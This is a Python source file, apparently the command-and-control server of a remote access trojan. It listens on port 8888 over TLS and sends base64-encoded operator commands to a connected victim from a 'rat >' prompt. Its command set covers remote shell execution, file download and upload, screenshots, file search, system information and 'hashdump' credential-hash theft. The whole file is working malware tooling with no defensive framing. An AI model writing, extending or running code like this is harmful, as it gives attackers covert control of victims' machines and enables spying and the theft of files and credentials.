import socket
import ssl
import threading
import base64
import os
import sys

# Ensure the utils module can be found
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from utils.shell import Shell
from utils.file_upload import FileUpload
from utils.file_download import FileDownload
from utils.screenshot import Screenshot
from utils.system_info import SystemInfo
from utils.network_info import NetworkInfo
from utils.file_search import FileSearch
from utils.command_help import CommandHelp

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8888

COMMANDS = [
    'help',
    'download <filepath>',
    'upload <filepath> <destination>',
    'shell <command>',
    'ipconfig',
    'screenshot',
    'search <filename>',
    'hashdump',
    'sysinfo',
    'exit',
    'quit'
]

def handle_client(client_socket, client_address):
    try:
        while True:
            cmd = input("rat > ").strip()
            client_socket.sendall(base64.b64encode(cmd.encode('utf-8')))
            if cmd.lower() in ('exit', 'quit'):
                break

            response = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                response += data
                if len(data) < 4096:
                    break

            if cmd.startswith("download"):
                _, filepath = cmd.split(maxsplit=1)
                filename = os.path.basename(filepath)
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(response))
                print(f"File saved as {filename}")
            else:
                try:
                    decoded_response = base64.b64decode(response).decode('utf-8')
                    print(decoded_response)
                except UnicodeDecodeError:
                    with open("screenshot.png", "wb") as f:
                        f.write(base64.b64decode(response))
                    print("Screenshot saved as screenshot.png")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    finally:
        client_socket.close()

def main():
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain(certfile="../certificate/server.crt", keyfile="../certificate/server.key")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((SERVER_HOST, SERVER_PORT))
        server_socket.listen(1)
        print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"[+] Client connected from {client_address}")
            client_socket = context.wrap_socket(client_socket, server_side=True)
            handle_client(client_socket, client_address)

if __name__ == "__main__":
    main()
